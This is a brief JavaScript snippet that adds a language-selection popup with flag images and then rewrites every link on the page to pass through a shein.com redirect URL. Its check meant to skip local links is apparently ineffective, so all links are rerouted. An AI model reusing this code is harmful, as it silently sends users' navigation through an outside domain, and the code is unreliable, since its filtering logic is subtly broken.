
window.onload = function() {
document.getElementById("new-product-item").innerHTML += '<div id="modalOverlay"> <div class="modalPopup"> <div class="headerBar"> </div> <div class="modalContent"> <h4>Choose Your Language</h4> <a href="#"> <img src="https://pngriver.com/wp-content/uploads/2018/04/Download-Germany-Flag.png"> </a> <a href="#"> <img src="https://upload.wikimedia.org/wikipedia/commons/6/62/Flag_of_France.png"> </a> </div> </div> </div>';
var links=[].slice.apply(document.getElementsByTagName("a"));links.forEach(function(e){var n=e.href;n.length&&"#"!==n.substring(0,1)&&"/"!==n.substring(0,1)&&(e.href="https://www.shein.com/?redirect="+encodeURIComponent(e.href),console.log(e.href))});
}